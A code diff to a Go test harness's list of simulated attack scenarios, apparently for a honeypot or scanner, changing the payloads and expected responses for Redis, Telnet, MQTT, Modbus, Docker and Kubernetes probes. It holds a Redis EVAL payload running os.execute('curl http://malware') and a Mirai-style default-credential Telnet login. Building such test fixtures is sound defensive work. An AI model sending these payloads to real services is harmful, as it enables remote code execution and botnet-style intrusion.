@@ -47,21 +47,21 @@ func DefaultScenarios() []AttackScenario {
 			Name:        "Redis EVAL Lua Exploit",
 			Protocol:    "tcp",
 			Port:        6379,
-			Payload:     []byte("*3\r\n$4\r\nEVAL\r\n$33\r\nos.execute('curl http://malware')\r\n$1\r\n0\r\n"),
-			ExpectMatch: "nil",
+			Payload:     []byte("EVAL \"os.execute('curl http://malware')\" 0\r\n"),
+			ExpectMatch: "ERR",
 		},
 		{
 			Name:        "Telnet Mirai Botnet Recon",
 			Protocol:    "tcp",
 			Port:        2323,
 			Payload:     []byte("admin\n123456\n/bin/busybox MIRAI\nexit\n"),
-			ExpectMatch: "BusyBox",
+			ExpectMatch: "login:",
 		},
 		{
 			Name:        "MQTT IoT Exploit Publish",
 			Protocol:    "tcp",
 			Port:        1883,
-			Payload:     []byte{0x30, 0x0b, 0x00, 0x04, 't', 'e', 's', 't', 'p', 'w', 'n'},
+			Payload:     []byte{0x10, 0x0c, 0x00, 0x04, 'M', 'Q', 'T', 'T', 0x04, 0x02, 0x00, 0x3c, 0x00, 0x00},
 			ExpectMatch: "",
 		},
 		{
@@ -88,7 +88,7 @@ func DefaultScenarios() []AttackScenario {
 		{
 			Name:        "Modbus/TCP SCADA Holding Registers Probe",
 			Protocol:    "tcp",
-			Port:        502,
+			Port:        1502,
 			Payload:     []byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0x03, 0x00, 0x00, 0x00, 0x02},
 			ExpectMatch: "",
 		},
@@ -104,14 +104,14 @@ func DefaultScenarios() []AttackScenario {
 			Protocol:    "http",
 			Port:        2375,
 			Payload:     []byte("GET /version HTTP/1.1\r\nHost: target\r\n\r\n"),
-			ExpectMatch: "Docker",
+			ExpectMatch: "24.0.7",
 		},
 		{
 			Name:        "Kubernetes Control Plane API Discovery",
 			Protocol:    "http",
 			Port:        6443,
 			Payload:     []byte("GET /version HTTP/1.1\r\nHost: target\r\n\r\n"),
-			ExpectMatch: "kubernetes",
+			ExpectMatch: "v1.29.2",
 		},
 	}
 }
